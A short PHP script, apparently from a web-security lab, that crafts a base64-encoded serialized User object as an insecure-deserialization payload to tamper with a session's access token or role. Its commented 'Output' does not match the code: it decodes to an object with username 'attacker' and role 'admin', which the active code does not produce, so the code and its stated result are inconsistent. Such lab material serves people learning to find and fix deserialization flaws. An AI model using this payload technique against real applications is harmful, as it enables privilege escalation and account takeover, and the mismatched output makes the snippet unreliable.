<?php
class User {
    public $username = "wiener";
    // public $role = "admin";  // Manipulasi role!
    // public $isLoggedIn = false;
    // public $admin = true;
    public $access_token = 0;
}

$payload = base64_encode(serialize(new User()));
echo $payload;
// Output: Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjg6ImF0dGFja2VyIjtzOjQ6InJvbGUiO3M6NToiYWRtaW4iO3M6MTA6ImlzTG9nZ2VkSW4iO2I6MDt9
?>